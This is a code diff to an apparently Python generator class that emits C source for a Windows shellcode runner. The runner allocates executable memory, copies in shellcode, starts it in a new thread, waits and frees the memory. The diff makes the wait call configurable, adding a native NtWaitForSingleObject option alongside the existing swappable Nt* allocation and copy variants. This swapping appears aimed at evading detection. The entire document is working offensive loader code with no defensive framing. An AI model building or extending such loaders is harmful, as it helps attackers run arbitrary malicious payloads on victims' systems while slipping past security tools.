@@ -2,16 +2,19 @@ from string import Template
 
 class shellcoderunner:
     def __init__(self, arguments):
-        self.apicallsList = ['WaitForSingleObject', 'CloseHandle']
+        self.apicallsList = ['CloseHandle']
         self.allocation = 'VirtualAlloc'
         self.execution = 'CreateThread'
         self.copy = 'memcpy'
+        self.wait = 'WaitForSingleObject'
         if 'allocation' in arguments:
             self.allocation = arguments['allocation']
         if 'execution' in arguments:
             self.execution = arguments['execution']
         if 'copy' in arguments:
             self.copy = arguments['copy']
+        if 'wait' in arguments:
+            self.wait = arguments['wait']
         if self.allocation == 'VirtualAlloc':
             self.allocationCode = """
     LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -60,6 +63,18 @@ class shellcoderunner:
     {NtWriteVirtualMemory}((HANDLE)-1, buffer, shellcode, {shellcodeSize}, &bytesWritten);
 """
             self.apicallsList += ['NtWriteVirtualMemory']
+        if self.wait == 'WaitForSingleObject':
+            self.waitCode = """
+    {WaitForSingleObject}(hThread, INFINITE);
+"""
+            self.apicallsList += ['WaitForSingleObject']
+        elif self.wait == 'NtWaitForSingleObject':
+            self.waitCode = """
+    LARGE_INTEGER li = {{ 0 }};
+    li.QuadPart = -1;
+    {NtWaitForSingleObject}(hThread, FALSE, &li);
+"""
+            self.apicallsList += ['NtWaitForSingleObject']
 
 
     def imports(self) -> list[str]:
@@ -89,9 +104,9 @@ class shellcoderunner:
     $execution
 
     // Wait for thread to finish
-    {WaitForSingleObject}(hThread, INFINITE);
+    $wait
     {CloseHandle}(hThread);
 
     // Clean up by freeing the memory we allocated for our shellcode
     $free
-""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, copy=self.copyCode)
+""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, copy=self.copyCode, wait=self.waitCode)
